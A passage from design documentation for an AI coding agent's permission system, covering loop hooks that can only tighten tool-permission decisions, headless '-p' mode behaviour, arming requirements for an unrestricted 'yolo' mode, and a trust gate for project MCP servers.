- **Not implemented**, though this section used to promise them: `Ctrl+G` to open the plan in `$EDITOR` before approving; pinning the plan as an `<approved_plan>` system-reminder on later turns; the sidebar card; seeding the task board from the plan's steps. `approved_plan` is written and never read — the seam is there, nothing is attached to it.

## Hooks

In-process loop hooks exist (`core/hooks.py`). A `LoopHook` may narrow the
tools offered for a request (`visible_tools`), answer a tool call itself
(`intercept`), tighten the engine's decision for a call (`check_tool`), or
observe a finished result (`after_tool`). Hooks run in list order and the first
to intercept wins. Plan mode is implemented as one, which is the proof the seam
is real rather than decorative.

User-configured command hooks are built on the same seam — see
[docs/HOOKS.md](HOOKS.md). What matters here: a `PreToolUse` hook runs *after*
this engine and can only tighten its answer. It can turn an allow into an ask
or a deny, and an ask into a deny; it can never turn either back into an allow,
so a hook that says "allow" skips no prompt, no protected path and no circuit
breaker (`docs/HOOKS.md#hooks-and-permissions`). A call the engine denies is
not shown to the hooks, and in `dontask` a hook's ask becomes a refusal like
the engine's own. A prompt a hook raised says so, with the
hook's reason, and offers nothing to "Always allow" (§The prompt).

## Headless mode

`-p` does **not** imply `dontask`. It starts in the mode an app session on the
same project would — `--mode`, else the active permission profile's, else the
composition's `default_mode`, else the `runtime.permissions` setting; `ask`
unless something says otherwise — capped by the composition's ceiling, because
both open their session through `session/assemble.py`. Yolo needs arming here
too: `--mode yolo` without `--yolo` (or `allow_yolo`) is an argument error, and
a profile or setting asking for it starts the run in `ask` with a note on
stderr. The app opening a session holds the same line, with a transcript note.
`-p` gets its no-hang property from a different place: `cli.py` hands the agent a
`_headless_permission_cb` that answers every prompt with
`allow=False, "headless: not permitted"`. The result the model sees is
`Permission denied by user: headless: not permitted`, so the run never hangs on
an invisible prompt.

The two paths differ in the message the model gets back. In `dontask` the engine
decides `deny` itself and the tool result reads *"Blocked by permission rules or
current mode"*. Under the default `ask` the engine decides `ask`, the callback
refuses, and the result reads *"Permission denied by user: headless: not
permitted"*. Either way nothing mutating runs without a rule, and neither path
records a `permission_request` in the session log — that event is emitted by the
server's `Conversation`, which a `-p` run does not have. If you want the
engine-level behaviour, pass it: `-p --mode dontask`.

`-p --mode yolo --yolo` exists for sandboxed CI use, same circuit breakers.

The trust gate holds in `-p` exactly as in the app: a run starts the user's
MCP servers and, only in a trusted project, the project's own, and says on
stderr which project servers it left inert. `--no-mcp` starts none.
